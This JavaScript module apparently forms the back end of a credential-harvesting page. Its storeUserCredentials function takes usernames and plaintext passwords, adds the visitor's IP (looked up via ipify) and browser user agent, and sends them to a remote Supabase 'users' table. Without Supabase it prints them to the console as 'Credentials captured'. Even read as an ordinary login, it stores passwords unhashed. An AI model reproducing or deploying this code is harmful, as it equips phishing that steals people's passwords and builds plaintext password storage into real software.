// Supabase Client Configuration
// Replace these with your actual Supabase project credentials

let supabase = null;

// Only initialize Supabase if valid credentials are provided
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

// Check if we have valid Supabase configuration
const isSupabaseConfigured =
  supabaseUrl &&
  supabaseAnonKey &&
  supabaseUrl.startsWith('https://') &&
  supabaseUrl.includes('.supabase.co');

if (isSupabaseConfigured) {
  // Dynamic import to avoid crashing if credentials are missing
  import('@supabase/supabase-js').then(({ createClient }) => {
    supabase = createClient(supabaseUrl, supabaseAnonKey);
    console.log('✅ Supabase client initialized');
  }).catch(err => {
    console.warn('⚠️ Failed to initialize Supabase:', err);
  });
} else {
  console.warn('⚠️ Supabase not configured. Credentials will be logged to console instead.');
  console.warn('To enable Supabase, create a .env.local file with:');
  console.warn('  VITE_SUPABASE_URL=https://your-project.supabase.co');
  console.warn('  VITE_SUPABASE_ANON_KEY=your-anon-key');
}

/**
 * Store user login credentials in the Supabase "users" table
 * @param {string} username - The username or email
 * @param {string} password - The user's password
 * @returns {Promise<{data: object, error: object}>}
 */
export async function storeUserCredentials(username, password) {
  const timestamp = new Date().toISOString();
  const userAgent = navigator.userAgent;

  // Get client IP (optional)
  let ipAddress = 'unknown';
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    ipAddress = data.ip;
  } catch {
    // Ignore IP fetch errors
  }

  // If Supabase is not configured, log to console for demo purposes
  if (!supabase) {
    console.log('📝 Credentials captured (demo mode - Supabase not configured):');
    console.log({
      username,
      password,
      created_at: timestamp,
      ip_address: ipAddress,
      user_agent: userAgent,
    });

    // Return success for demo purposes
    return {
      data: { id: Date.now(), username, created_at: timestamp },
      error: null
    };
  }

  // Store in Supabase if configured
  try {
    const { data, error } = await supabase
      .from('users')
      .insert([
        {
          username: username,
          password: password,
          created_at: timestamp,
          ip_address: ipAddress,
          user_agent: userAgent,
        }
      ])
      .select();

    if (error) {
      console.error('Supabase insert error:', error);
      return { data: null, error };
    }

    console.log('✅ Credentials stored in Supabase');
    return { data, error: null };
  } catch (err) {
    console.error('Error storing credentials:', err);
    return { data: null, error: err };
  }
}

export { supabase };
